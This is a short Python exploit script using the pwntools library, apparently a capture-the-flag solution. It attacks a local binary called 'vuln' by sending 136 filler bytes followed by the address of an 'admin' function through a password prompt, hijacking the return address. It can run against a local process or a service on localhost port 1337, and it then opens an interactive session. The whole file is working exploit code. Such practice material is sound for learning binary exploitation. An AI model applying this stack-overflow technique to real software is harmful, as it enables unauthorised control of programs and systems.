#!/usr/bin/env python3

from pwn import *
import sys

context.binary = elf = ELF("./vuln")
context.terminal = ['xfce4-terminal', '-e']
context.log_level = 'debug'

if len(sys.argv) > 1:
    p = remote("127.0.0.1", 1337)
else:
    p = process(elf.path)

payload = flat(
    b"A" * 136,
    elf.sym.admin
)

# overflow can occur in either username or password, pick your poison
p.sendlineafter(b"username: ", b"elmo")
p.sendlineafter(b"password: ", payload)

p.interactive()